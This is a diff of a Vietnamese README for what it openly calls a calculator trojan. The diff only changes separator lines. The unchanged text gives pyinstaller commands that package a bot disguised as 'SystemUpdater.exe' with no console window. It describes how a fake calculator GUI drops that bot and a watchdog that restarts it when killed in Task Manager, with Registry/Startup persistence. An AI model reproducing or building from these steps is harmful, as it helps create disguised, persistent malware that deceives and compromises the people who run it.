@@ -1,6 +1,6 @@
 Ở Phiên bản này watchdog sẽ được tách riêng để khi kill tiến trình trong TaskManager nó sẽ tự khởi động lại
 
-====================================Đóng gói============================================================================
+====================================Đóng gói==========================================================================
    Đóng gói bot_test_V3.py:
 pyinstaller --noconsole --onefile --icon=SystemUpdater.ico --hidden-import=psutil bot_test_V3.py
 copy dist\bot_test_V3.exe SystemUpdater.exe
@@ -12,7 +12,7 @@ copy dist\watchdog.exe watchdog.exe
     Đóng gói calculator_trojan_V3.py:
 pyinstaller --noconsole --onefile --icon=calculator.ico --add-data "SystemUpdater.exe;." --add-data "watchdog.exe;." --hidden-import=psutil --hidden-import=tkinter --hidden-import=pywin32 calculator_trojan_V3.py
 
-======================================Tổng quan Các Thành Phần==========================================================================
+======================================Tổng quan Các Thành Phần================================================
 1) calculator_trojan_V3.py:
     Đây là file chính, khởi động giao diện calculator (GUI) và chịu trách nhiệm triển khai bot (SystemUpdater.exe) và watchdog (watchdog.exe).
     Tạo persistence (Registry/Startup) để đảm bảo watchdog.exe tự chạy sau khi khởi động máy.
@@ -23,7 +23,7 @@ pyinstaller --noconsole --onefile --icon=calculator.ico --add-data "SystemUpdate
 3) watchdog.py (đóng gói thành watchdog.exe):
     Độc lập, giám sát SystemUpdater.exe và khởi động lại nếu bot bị kill.
     Ghi log riêng để theo dõi hoạt động.
-=======================================Luồng dữ liệu=========================================================================
+=======================================Luồng dữ liệu=======================================
 1) Khởi động chương trình
 Người dùng chạy calculator_trojan_V3.exe (được đóng gói từ calculator_trojan_V3.py).
     Kiểm tra single instance:
